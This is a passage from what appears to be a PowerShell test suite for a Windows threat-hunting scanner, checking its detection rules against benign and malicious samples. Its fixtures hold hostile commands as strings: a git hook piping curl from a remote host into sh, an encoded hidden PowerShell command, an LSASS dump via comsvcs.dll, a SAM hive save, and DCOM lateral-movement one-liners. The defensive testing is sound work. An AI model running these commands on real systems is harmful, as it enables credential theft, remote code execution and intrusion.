                     'C:\Users\dev\source\repos\app\.venv\Lib\x\package.json',
                     'C:\Users\dev\source\repos\app\.git\objects\ab\cdef')) {
    Assert-True "devtool allowlist DOES suppress '$noise'" ($noise -match $devtoolAllow)
}
# A stock hooks directory holds only .sample files, and their shipped content must not
# match a hook rule — otherwise every developer workstation reports findings.
$stockSample = @'
#!/bin/sh
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.
if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
fi
exec git diff-index --check --cached $against --
'@
function Test-BandRules { param($Rules, [string]$Text)
    foreach ($r in @($Rules)) { if ($r.Pattern -and $Text -match $r.Pattern) { return "$($r.Name)" } }
    return '' }
Assert-That 'a stock .sample git hook matches NO hook rule' (Test-BandRules $sig.devtool_hook_rules $stockSample) ''
# ...and a weaponised one does.
foreach ($evil in @('#!/bin/sh
powershell -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==',
                    '#!/bin/sh
curl http://192.168.13.7:8080/p | sh',
                    '#!/bin/sh
node -e "require(''child_process'').execSync(''calc'')"')) {
    Assert-True 'a weaponised git hook DOES match a hook rule' ((Test-BandRules $sig.devtool_hook_rules $evil) -ne '')
}
# config.json is deliberately absent from the staged-name list: it is far too common in
# Temp and ProgramData, and including it would drown the staging branch in noise.
$stagedNames = @($sig.cloud_cred_staged_names)
function Test-BandNames { param($Rules,[string]$Name)
    foreach ($r in @($Rules)) { if ($Name -match $r) { return $true } }
    return $false }
Assert-True 'staged-name list ignores the ubiquitous config.json' (-not (Test-BandNames $stagedNames 'config.json'))
foreach ($nm in @('credentials','id_rsa','msal_token_cache.bin','.git-credentials','terraform.tfstate','kubeconfig')) {
    Assert-True "staged-name list catches '$nm'" (Test-BandNames $stagedNames $nm)
}
# The ESP inventory must accept what belongs there and reject what does not.
$espRules = @($sig.esp_expected_paths)
foreach ($okDir in @('\EFI\Microsoft','\EFI\Boot','\EFI\HP','\EFI\ubuntu','\System Volume Information')) {
    Assert-True "ESP inventory accepts '$okDir'" (Test-BandNames $espRules $okDir)
}
foreach ($badDir in @('\EFI\evil','\EFI\Update','\EFI\systemd-boot-x')) {
    Assert-True "ESP inventory flags '$badDir'" (-not (Test-BandNames $espRules $badDir))
}
# Phase 40 already owns testsigning/nointegritychecks; 159 must not duplicate them.
foreach ($dup in @('testsigning','nointegritychecks')) {
    Assert-That "bcd_unsafe_flags does not duplicate phase 40's '$dup'" `
        (@(@($sig.bcd_unsafe_flags) | Where-Object { "$($_.Pattern)" -match $dup }).Count) 0
}
Assert-True 'bcd_unsafe_flags covers disableelamdrivers' `
    (@(@($sig.bcd_unsafe_flags) | Where-Object { "$($_.Pattern)" -match 'disableelamdrivers' }).Count -eq 1)
# The dbx floor is a "never updated" floor, not a fabricated exact baseline.
Assert-True 'dbx baseline ships a MinBytes floor, not an exact size' `
    ($null -ne $sig.dbx_current_baseline.MinBytes -and [int]$sig.dbx_current_baseline.MinBytes -gt 0)
Assert-True 'dbx baseline names the reference update' ("$($sig.dbx_current_baseline.ReferenceKb)" -match '^KB\d+$')

# ── 15. RULE SETS RUN AGAINST REALISTIC CONTENT ──────────────────────────────
# This section exists because four rules shipped on 2026-08-30 that could not fire, or fired
# on every healthy machine, and §13 did not notice: it compile-checks pattern STRINGS and
# greps them for a keyword. A pattern that compiles is not a pattern that works. CLAUDE.md
# already says this for path-shaped rules ("a path-shaped rule cannot be exercised by the
# Linux fixture tree"); it applies just as much to bcdedit- and ini-shaped ones.
Write-Host "`n-- rule sets vs realistic content --" -ForegroundColor Cyan
function Get-BandRuleHits { param($Rules, [string]$Text)
    $out = @()
    foreach ($r in @($Rules)) {
        if (-not $r.Pattern) { continue }
        if ($Text -match $r.Pattern) { $out += "$($r.Name)" }
    }
    return ,$out
}

# bcdedit pads the element name out to column 24 — the gap can be TWENTY spaces. The original
# rules used \s{1,8}, so four of seven could never reach the value at all; and the value was
# matched with [^\r\n], which let the engine backtrack INTO the padding where the negative
# lookahead trivially succeeded, so BCD-CustomBootLoader fired on every healthy UEFI machine.
$bcdHealthy = @"
Windows Boot Loader
-------------------
identifier              {current}
device                  partition=C:
path                    \WINDOWS\system32\winload.efi
description             Windows 10
recoveryenabled         Yes
integrityservices       Enable
osdevice                partition=C:
systemroot              \WINDOWS
bootmenupolicy          Standard
"@
$bcdUnsafe = $bcdHealthy + @"

disableelamdrivers      Yes
flightsigning           Yes
debug                   Yes
bootdebug               Yes
safeboot                Minimal
integrityservices       Disable
"@
Assert-That 'bcd rules are SILENT on healthy bcdedit output' `
    ((Get-BandRuleHits $sig.bcd_unsafe_flags $bcdHealthy).Count) 0
foreach ($n in @('BCD-DisableElamDrivers','BCD-FlightSigning','BCD-IntegrityServicesDisabled',
                 'BCD-KernelDebugEnabled','BCD-BootDebugEnabled','BCD-SafeBootConfigured')) {
    Assert-True "bcd rule '$n' actually fires on real bcdedit padding" `
        ((Get-BandRuleHits $sig.bcd_unsafe_flags $bcdUnsafe) -contains $n)
}

# core.fsmonitor = true is what Git for Windows 2.37+ and Scalar write themselves. It was a
# HIGH finding telling the operator their git config was weaponised.
$gitStock = "[core]`n`trepositoryformatversion = 0`n`tfsmonitor = true`n`tautocrlf = true`n`tbare = false`n"
$gitLfs   = "[filter `"lfs`"]`n`tclean = git-lfs clean -- %f`n`tsmudge = git-lfs smudge -- %f`n"
$gitEvil  = "[core]`n`tfsmonitor = C:\\Users\\dev\\AppData\\Local\\Temp\\hook.exe`n"
Assert-That 'gitconfig rules are SILENT on a stock [core] block' `
    ((Get-BandRuleHits $sig.devtool_gitconfig_rules $gitStock).Count) 0
Assert-True 'gitconfig rules DO flag a command-valued fsmonitor' `
    ((Get-BandRuleHits $sig.devtool_gitconfig_rules $gitEvil) -contains 'GitConfig-FsMonitorCommand')
Assert-True 'gitconfig rules see a Git LFS filter (POSSIBLE, by design)' `
    ((Get-BandRuleHits $sig.devtool_gitconfig_rules $gitLfs) -contains 'GitConfig-FilterProcess')

# The NuGet rule matched any non-URL config value, e.g. value="Highest".
$nugetStock = '<configuration><config><add key="dependencyVersion" value="Highest" /><add key="globalPackagesFolder" value="C:\packages" /></config><packageSources><add key="nuget.org" value="https://api.nuget.org/v3/index.json" /></packageSources></configuration>'
$nugetEvil  = '<packageSources><add key="internal" value="https://pkgs.evil.example/v3/index.json" /></packageSources>'
$npmStock   = "registry=https://registry.npmjs.org/`nsave-exact=true`n"
$npmStock2  = "registry = https://registry.npmjs.org/`n"
$npmEvil    = "registry=https://npm.evil.example/`n"
Assert-That 'registry rules are SILENT on a stock NuGet.Config' `
    ((Get-BandRuleHits $sig.devtool_registry_rules $nugetStock).Count) 0
Assert-That 'registry rules are SILENT on a stock .npmrc (no spaces)' `
    ((Get-BandRuleHits $sig.devtool_registry_rules $npmStock).Count) 0
Assert-That 'registry rules are SILENT on a stock .npmrc (spaced)' `
    ((Get-BandRuleHits $sig.devtool_registry_rules $npmStock2).Count) 0
Assert-True 'registry rules DO flag a redirected NuGet feed' `
    ((Get-BandRuleHits $sig.devtool_registry_rules $nugetEvil) -contains 'DevRegistry-NonDefaultNuGet')
Assert-True 'registry rules DO flag a redirected npm registry' `
    ((Get-BandRuleHits $sig.devtool_registry_rules $npmEvil) -contains 'DevRegistry-NonDefaultNpm')

# Phase 147: the content rules must not fire on an ordinary config, and the PrivateKeyBlock
# rule must no longer be reachable from an SSH key file — cloud_cred_text_formats used to
# admit id_rsa, which made that rule tautological.
$awsStock = "[default]`nregion = eu-west-2`noutput = json`n"
$awsLive  = "[default]`naws_access_key_id = AKIAIOSFODNN7EXAMPLE`naws_secret_access_key = wJalrXUtnFEMIbKxxxxxxxxxxxxxxxxxxxxxxxxx`n"
Assert-That 'cloud content rules are SILENT on a stock .aws/config' `
    ((Get-BandRuleHits $sig.cloud_cred_content_rules $awsStock).Count) 0
Assert-True 'cloud content rules DO flag an AWS key id shape' `
    ((Get-BandRuleHits $sig.cloud_cred_content_rules $awsLive) -contains 'Cred-AwsAccessKeyId')
Assert-True 'an SSH key file is no longer content-scanned (PrivateKeyBlock was tautological)' `
    (-not (Test-BandNames $sig.cloud_cred_text_formats 'id_rsa'))

# Phase 157 dropper rules against realistic shell-file content.
$urlBenign = "[InternetShortcut]`nURL=https://intranet.example/portal`nIconIndex=0`n"
$urlUnc    = "[InternetShortcut]`nURL=https://intranet.example/portal`nIconFile=\\10.0.0.9\share\a.ico`n"
Assert-That 'dropper rules are SILENT on an ordinary .url shortcut' `
    ((Get-BandRuleHits $sig.persist_dropper_content_rules $urlBenign).Count) 0
Assert-True 'dropper rules DO flag a UNC IconFile (NTLM coercion)' `
    ((Get-BandRuleHits $sig.persist_dropper_content_rules $urlUnc) -contains 'Dropper-UncIconFile')


# ── 16. Phases 148-152 (task F2) — structure, narrowings and anti-duplication ─
Write-Host "`n-- phases 148-152 (task F2): lateral / credential / Kerberos --" -ForegroundColor Cyan

$p1  = Get-Content (Join-Path $root 'engine/Phases-1.ps1') -Raw
$p3  = Get-Content (Join-Path $root 'engine/Phases-3.ps1') -Raw
$p4  = Get-Content (Join-Path $root 'engine/Phases-4.ps1') -Raw

# (a) Signature-DB hygiene for the F2 keys, on the same contract as every band before it.
$f2Keys = @('lateral_remote_exec_parents','lateral_remote_exec_children','lateral_dcom_rules',
            'lateral_remote_task_rules','lateral_admin_shares','lateral_remote_exec_benign_cmdlines',
            'lateral_share_benign_sources','creddump_cmdline_rules','creddump_hive_names',
            'creddump_hive_benign_paths','creddump_search_roots_raw','creddump_thresholds',
            'kerberos_ticket_thresholds','kerberos_weak_etype_rules','kerberos_etype_benign_services',
            'outbound_session_keys','outbound_session_secret_names','outbound_session_files_raw',
            'outbound_session_file_rules','outbound_session_benign_paths',
            'logon_anomaly_thresholds','logon_benign_accounts','logon_explicit_cred_benign_procs')
foreach ($k in $f2Keys) {
    Assert-True "sig — key '$k' present and non-empty" ($null -ne $sig.$k -and @($sig.$k).Count -gt 0)
    Assert-True "sig — key '$k' carries a _comment"     ($null -ne $sig."_comment_$k")
    Assert-True "loader — pulls '$k'" ($loader -match "(?:Get-Sig|Join-AllowRegex) '$k'")
}
foreach ($k in @('creddump_search_roots_raw','outbound_session_files_raw')) {
    Assert-True "sig — '$k' entries are `$env:-prefixed literals" `
        (@(@($sig.$k) | Where-Object { "$_" -notmatch '^\$env:' }).Count -eq 0)
    Assert-True "loader — '$k' is ExpandString-expanded at load" `
        ($loader -match "(?s)Get-Sig '$k'\) \| ForEach-Object \{ \`$ExecutionContext\.InvokeCommand\.ExpandString")
}
# Allowlists: compile, and none universal (the E1 blinding attack).
$f2AllowKeys = @('lateral_remote_exec_benign_cmdlines','lateral_share_benign_sources',
                 'creddump_hive_benign_paths','kerberos_etype_benign_services',
                 'outbound_session_benign_paths','logon_benign_accounts',
                 'logon_explicit_cred_benign_procs')
foreach ($k in $f2AllowKeys) {
    $univ = 0; $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        $rx = $null
        try { $rx = New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150)) }
        catch { $nocomp++; continue }
        $all = $true
        foreach ($c in $canaries) { if (-not $rx.IsMatch($c)) { $all = $false; break } }
        if ($all) { $univ++ }
    }
    Assert-That "sig — '$k' all patterns compile"      $nocomp 0
    Assert-That "sig — '$k' has no universal pattern"  $univ   0
}
# A COMMAND LINE is attacker-authored text, so its allowlist must pin the whole string.
# A name-only prefix would let malware self-allowlist by naming its command after an RMM
# one — the failure class caught in review on 2026-07-02 and re-proved for Active Setup.
foreach ($pat in @($sig.lateral_remote_exec_benign_cmdlines)) {
    Assert-True "sig — RMM command-line allowlist entry is fully anchored" `
        ($pat -match '^\^' -and $pat -match '\$$')
    Assert-True "sig — RMM command-line allowlist entry uses bounded wildcards, never .*" `
        ($pat -notmatch '\.\*')
}
foreach ($pat in @($sig.logon_benign_accounts)) {
    Assert-True "sig — logon account allowlist entry is fully anchored: $pat" `
        ($pat -match '^\^' -and $pat -match '\$$')
}

# (b) The five phases are wired, gated and Info-only. Rule #1 and the trap rule are already
#     asserted for the whole module in sections 1 and 2; what is checked here is that the
#     new phases sit INSIDE the HUNT gate rather than running in every mode.
foreach ($n in @(148,149,150,151,152)) {
    Assert-True "Phase $n — emitted inside the PhasePlan.Hunt gate" `
        ($p6.IndexOf(('Show-PhaseHeader "PHASE {0}"' -f $n)) -gt $p6.IndexOf('if ($PhasePlan.Hunt) {'))
}

# (c) THE ANTI-DUPLICATION CONTRACT, both directions. Phase 157 shipped six mechanisms
#     phase 126 already owned, and phase 160 then correlated the two findings about one
#     artifact as though they were independent facts. These assertions fail if 148-152
#     grow a second opinion on something another phase reports, AND fail if the owning
#     phase loses it.
Assert-True 'phase 133 still owns the wmic /node lateral command line' `
    ((($sig.lateral_movement_artifacts | ForEach-Object { "$($_.Rx)" }) -join ' ') -match 'wmic')
Assert-True 'phase 133 still owns the schtasks /s lateral command line' `
    ((($sig.lateral_movement_artifacts | ForEach-Object { "$($_.Rx)" }) -join ' ') -match 'schtasks')
$dcomPats = ($sig.lateral_dcom_rules | ForEach-Object { "$($_.Pattern)" }) -join ' '
Assert-True 'phase 148 does NOT re-match wmic (phase 133 owns it)'    ($dcomPats -notmatch 'wmic')
Assert-True 'phase 148 does NOT re-match schtasks (phase 133 owns it)' ($dcomPats -notmatch 'schtasks')
Assert-True 'phase 148 does NOT re-match the PsExec service names (phase 133 owns them)' `
    ($dcomPats -notmatch '(?i)psexesvc|paexec|remcomsvc')
Assert-True 'phase 107 still queries event 7045 and 4624' (($p3 -match '\b7045\b') -and ($p3 -match '\b4624\b'))
Assert-True 'phase 148 does NOT re-report the 7045 service-install record' `
    ($p6 -notmatch 'Id\s*@?\(?\s*7045')
# Phase 152 must emit NO per-record 4624 finding: phase 107 already reports one per record,
# and two findings on one event id would give phase 160 a shared target to correlate on.
Assert-True 'phase 152 does NOT pull event 4624 (phase 107 owns it)' `
    ($p6 -notmatch 'Get-ScytheEvents[^\r\n]*4624')
Assert-True 'phase 106 still owns the crash-dump directories' `
    (($p3 -match 'CrashDumps') -and ($p3 -match 'Minidump'))
Assert-True 'phase 149 search roots exclude %TEMP% (phase 106 owns it)' `
    (@(@($sig.creddump_search_roots_raw) | Where-Object { "$_" -match '(?i)\$env:TEMP$|CrashDumps' }).Count -eq 0)
Assert-True 'phase 41 still owns WDigest UseLogonCredential and LSA RunAsPPL' `
    (($p1 -match 'UseLogonCredential') -and ($p1 -match 'RunAsPPL'))
# The check is on the registry READ, never on the file text: this band is FixAction Info,
# so the phase comments legitimately NAME what other phases own, and a text match fires on
# the sentence that documents the narrowing (the same trap section 9 solved with the AST).
Assert-True 'phase 149 does NOT re-read WDigest UseLogonCredential (phase 41 owns it)' `
    ($p6 -notmatch "-Name\s+'?UseLogonCredential")
Assert-True 'phase 149 does NOT re-read LSA RunAsPPL (phase 41 owns it)' `
    ($p6 -notmatch "-Name\s+'?RunAsPPL")
Assert-True 'phase 129 still owns winscp.ini (exfil staging config)' `
    ((($sig.exfil_staging_tools | ForEach-Object { ($_.config_raw -join ' ') }) -join ' ') -match '(?i)winscp\.ini')
Assert-True 'phase 151 does NOT re-read winscp.ini (phase 129 owns it)' `
    (@(@($sig.outbound_session_files_raw) | Where-Object { "$_" -match '(?i)winscp\.ini' }).Count -eq 0)
Assert-True 'phase 150 does NOT re-report SMB signing (phase 153 owns it)' `
    ($p6 -match 'NET153_SRVSIGN')
Assert-True 'phase 88 still owns the 4769 golden-ticket event view' `
    ((Get-Content (Join-Path $root 'engine/Phases-2.ps1') -Raw) -match '4769')

# (d) THE REACH NARROWING. The F2 brief asked for a domain-wide AS-REP / delegation /
#     AdminSDHolder sweep and for ADCS ESC8. Both were dropped: the sweep is, query for
#     query, what BloodHound issues against the customer's own directory, and ESC8 needs
#     an HTTP request to a customer server. Phase 150 reads ONE object — this computer's —
#     with both timeouts set. Revert-proofed the way phase 159's "mounts nothing" is.
Assert-True 'phase 150 queries only this computer by sAMAccountName' `
    ($p6 -match 'objectClass=computer\)\(sAMAccountName=')
Assert-True 'phase 150 sets SizeLimit on the directory search'       ($p6 -match '\.SizeLimit\s*=\s*1\b')
Assert-True 'phase 150 sets a client timeout on the directory search' ($p6 -match '\.ClientTimeout\s*=')
Assert-True 'phase 150 sets a server time limit on the directory search' ($p6 -match '\.ServerTimeLimit\s*=')
# Banned tokens are ones that can only appear in CODE. AdminSDHolder and adminCount are
# deliberately absent from this list: the phase banner names them when it explains what was
# dropped, and banning the word would ban the explanation.
foreach ($banned in @('objectCategory=person','objectClass=user','samAccountType=',
                      'userAccountControl:1\.2\.840\.113556\.1\.4\.803',
                      'DirectorySearcher\(\)','\.FindAll\(')) {
    Assert-True "phase 150 does not enumerate the directory ($banned)" ($p6 -notmatch $banned)
}
Assert-That 'phase 150 builds exactly ONE directory search' `
    (@([regex]::Matches($p6,'\[ADSISearcher\]')).Count) 1
foreach ($banned in @('Invoke-WebRequest','Invoke-RestMethod','Net\.WebClient','certsrv','System\.Net\.Sockets','New-Object System\.Net')) {
    Assert-True "phases 148-152 send no network traffic ($banned)" ($p6 -notmatch $banned)
}
# klist and cmdkey are read-only Microsoft binaries, but a hung KDC must not hang the scan.
Assert-True 'console tools run only through Invoke-ScytheConsoleTool' `
    (($p6 -notmatch '(?m)^\s*&\s*[''"]?(klist|cmdkey)') -and ($p6 -notmatch 'Start-Process[^\r\n]*(klist|cmdkey)'))
Assert-True 'Invoke-ScytheConsoleTool enforces a deadline and kills on expiry' `
    (($p6 -match 'WaitForExit\(\$TimeoutMs\)') -and ($p6 -match '\$proc\.Kill\(\)'))
Assert-True 'Invoke-ScytheConsoleTool drains stderr asynchronously (audit H2)' `
    ($p6 -match 'StandardError\.ReadToEndAsync\(\)')

# (e) THE WALL-CLOCK CONTRACT. Every existing event query in the engine filters time
#     client-side; on a domain workstation with a large Security log that materialises
#     hundreds of thousands of records first. StartTime inside the FilterHashtable
#     compiles to server-side XPath, and the pull is memoised per (log, id-set, cap).
Assert-True 'Get-ScytheEvents puts StartTime INSIDE the FilterHashtable' `
    ($p6 -match "\`$filter\['StartTime'\]\s*=\s*\`$global:TIME_LIMIT")
Assert-True 'Get-ScytheEvents memoises its pulls' ($p6 -match 'SCYTHE_EVT_CACHE')
Assert-True 'Get-ScytheEvents goes through the safe wrapper' ($p6 -match 'Get-WinEventSafe -Filter \$filter')
$p6EvtCalls = @($p6ast.FindAll({ param($n)
    $n -is [System.Management.Automation.Language.CommandAst] -and
    "$($n.GetCommandName())" -eq 'Get-WinEventSafe' }, $true)).Count
Assert-That 'Phases-6 reaches the event log through exactly one call site' $p6EvtCalls 1
# The positional .Properties read is the fast path; a value that does not look like the
# field it claims to be must fall back to the named lookup, because the provider layout
# is a manifest detail and a silently-wrong index would put an account name in the
# source-address column of a client report.
Assert-True 'Get-ScytheEvtField validates the positional read' ($p6 -match '\$Validate -eq')
Assert-True 'Get-ScytheEvtField falls back to the named lookup' ($p6 -match 'EventData\.Data \| Where-Object')

# (f) THE RULE SETS, RUN AGAINST REALISTIC CONTENT. A pattern that compiles is not a
#     pattern that works — four rules shipped in this band that could not fire, or fired
#     on every healthy machine, and the suite did not notice because it only compiled them.
$mmcBenign = '"C:\Windows\System32\mmc.exe" "C:\Windows\System32\compmgmt.msc" /computer:.'
$mmcEvil   = "powershell.exe -nop -c [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.5'))"
$shwEvil   = "powershell -c [type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','10.0.0.5')"
Assert-That 'DCOM rules are SILENT on an ordinary mmc.exe console launch' `
    ((Get-BandRuleHits $sig.lateral_dcom_rules $mmcBenign).Count) 0
Assert-True 'DCOM rules DO flag MMC20.Application by ProgID' `
    ((Get-BandRuleHits $sig.lateral_dcom_rules $mmcEvil) -contains 'MMC20.Application DCOM')
Assert-True 'DCOM rules DO flag ShellWindows by CLSID (the half that cannot be renamed)' `
    ((Get-BandRuleHits $sig.lateral_dcom_rules $shwEvil) -contains 'ShellWindows DCOM')

$taskBenign = 'C:\Program Files\Vendor\agent.exe --run --quiet'
$taskUnc    = '\\10.0.0.5\ADMIN$\svc_update.exe -install'
Assert-That 'task rules are SILENT on an ordinary local task action' `
    ((Get-BandRuleHits $sig.lateral_remote_task_rules $taskBenign).Count) 0
Assert-True 'task rules DO flag an action on an administrative share' `
    ((Get-BandRuleHits $sig.lateral_remote_task_rules $taskUnc) -contains 'Task action on an administrative share')
# Phase 148 composes "Execute Arguments" before matching, so no rule may end with $ —
# the LNK-ScriptHostTarget lesson: an anchored rule against a composed string never fires.
foreach ($r in @($sig.lateral_remote_task_rules)) {
    # An ESCAPED trailing dollar is a literal — ADMIN$ ends three of these rules — so the
    # test looks for an unescaped one, which is the anchor that could never fire.
    Assert-True "task rule '$($r.Name)' carries no end-of-string anchor (composed string)" `
        ("$($r.Pattern)" -notmatch '(?<!\\)\$$')
}

$cdBenign  = '"C:\Windows\System32\rundll32.exe" shell32.dll,Control_RunDLL desk.cpl'
$cdComsvcs = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 640 C:\Users\Public\l.dmp full'
$cdRegSave = 'reg save hklm\sam C:\Users\Public\sam.hiv'
$cdRegOk   = 'reg query hklm\software\microsoft\windows\currentversion'
Assert-That 'credential-dump rules are SILENT on an ordinary rundll32 control-panel launch' `
    ((Get-BandRuleHits $sig.creddump_cmdline_rules $cdBenign).Count) 0
Assert-That 'credential-dump rules are SILENT on an ordinary reg query' `
    ((Get-BandRuleHits $sig.creddump_cmdline_rules $cdRegOk).Count) 0
Assert-True 'credential-dump rules DO flag comsvcs.dll MiniDump' `
    ((Get-BandRuleHits $sig.creddump_cmdline_rules $cdComsvcs) -contains 'comsvcs.dll MiniDump (LSASS)')
Assert-True 'credential-dump rules DO flag reg save of the SAM hive' `
    ((Get-BandRuleHits $sig.creddump_cmdline_rules $cdRegSave) -contains 'reg save of a credential hive')

foreach ($hv in @('SAM','SYSTEM','SECURITY','ntds.dit','SAM.bak')) {
    Assert-True "hive-name list catches '$hv'" (Test-BandNames $sig.creddump_hive_names $hv)
}
foreach ($nothv in @('system.ini','SAMSUNG.exe','Security.evtx','systeminfo.txt','ntdsapi.dll')) {
    Assert-True "hive-name list ignores '$nothv'" (-not (Test-BandNames $sig.creddump_hive_names $nothv))
}
# The hive allowlist must not cover the directories the branch exists for — the phase-130
# discord failure, where an allowlist made its own detection branch unreachable.
function Join-F2Allow { param([string]$Key) $a = @($sig.$Key); if ($a.Count) { ($a -join '|') } else { '(?!)' } }
$hiveAllow = Join-F2Allow 'creddump_hive_benign_paths'
foreach ($staged in @('C:\Users\tech\Downloads\SAM','C:\Users\Public\ntds.dit',
                      'C:\ProgramData\SYSTEM','C:\PerfLogs\SECURITY','C:\Windows\Temp\SAM')) {
    Assert-True "hive allowlist does NOT swallow a staged copy at '$staged'" ($staged -notmatch $hiveAllow)
}
# NOT $home: PowerShell's $HOME is a read-only automatic variable and assigning it throws
# — the same class of collision as the one-letter helper names that shadow built-in aliases.
foreach ($hiveHome in @('C:\Windows\System32\config\SAM','C:\Windows\NTDS\ntds.dit')) {
    Assert-True "hive allowlist DOES cover the legitimate home '$hiveHome'" ($hiveHome -match $hiveAllow)
}

$etypeGood = 'AES-256-CTS-HMAC-SHA1-96'
$etypeWeak = 'RSADSI RC4-HMAC(NT)'
Assert-That 'Kerberos etype rules are SILENT on an AES-256 ticket' `
    ((Get-BandRuleHits $sig.kerberos_weak_etype_rules $etypeGood).Count) 0
Assert-True 'Kerberos etype rules DO flag an RC4-HMAC ticket' `
    ((Get-BandRuleHits $sig.kerberos_weak_etype_rules $etypeWeak) -contains 'RC4-HMAC service ticket')

$sessBenign = '<Node Name="srv01" Hostname="10.0.0.5" Username="admin" Password="" Protocol="RDP" />'
$sessEvil   = '<Node Name="srv01" Hostname="10.0.0.5" Username="admin" Password="pFqXm2lKd9sQ" Protocol="RDP" />'
Assert-That 'session-file rules are SILENT on a profile with no stored password' `
    ((Get-BandRuleHits $sig.outbound_session_file_rules $sessBenign).Count) 0
Assert-True 'session-file rules DO flag a stored password' `
    ((Get-BandRuleHits $sig.outbound_session_file_rules $sessEvil).Count -gt 0)

$acctAllow = Join-F2Allow 'logon_benign_accounts'
foreach ($noise in @('DWM-1','UMFD-0','ANONYMOUS LOGON','WKSTN01$','-')) {
    Assert-True "logon allowlist filters the routine account '$noise'" ($noise -match $acctAllow)
}
foreach ($real in @('jsmith','Administrator','svc_backup','helpdesk.admin')) {
    Assert-True "logon allowlist does NOT filter the real account '$real'" ($real -notmatch $acctAllow)
}
# Event 4648's allowlist is on the calling image PATH — the safe kind. It must not cover a
# shell or a script host, because a shell supplying somebody else's credential IS the case
# the branch exists for.
$explAllow = Join-F2Allow 'logon_explicit_cred_benign_procs'
foreach ($shell in @('C:\Windows\System32\cmd.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                     'C:\Windows\System32\wscript.exe','C:\Users\tech\AppData\Local\Temp\a.exe')) {
    Assert-True "4648 allowlist does NOT swallow '$shell'" ($shell -notmatch $explAllow)
}
foreach ($ok in @('C:\Windows\System32\svchost.exe','C:\Program Files\CentraStage\CagService.exe')) {
    Assert-True "4648 allowlist DOES cover the routine caller '$ok'" ($ok -match $explAllow)
}

# (g) Thresholds are objects, not lists, and are indexed through @(...) — a bare [0] on a
#     single-element Get-Sig return indexes the first CHARACTER of a string on 5.1.
foreach ($k in @('creddump_thresholds','kerberos_ticket_thresholds','logon_anomaly_thresholds')) {
    Assert-True "loader — '$k' is indexed through @(...)[0]" `
        ($loader -match "@\(Get-Sig '$k'\)\[0\]")
}
# The golden-ticket threshold has to sit far above every legitimate policy, or the phase
# becomes an argument about ticket lifetimes on healthy domains. A KDC issues 10 hours.
Assert-True 'golden-ticket threshold is well above any real Kerberos policy' `
    ([int]@($sig.kerberos_ticket_thresholds)[0].MaxTicketHours -ge 168)
Assert-True 'spray threshold requires several DISTINCT accounts, not just many failures' `
    ([int]@($sig.logon_anomaly_thresholds)[0].SprayDistinctAccounts -ge 3)

Write-Host "`n  $pass passed, $fail failed" -ForegroundColor $(if($fail){'Red'}else{'Green'})
if ($fail) { exit 1 }
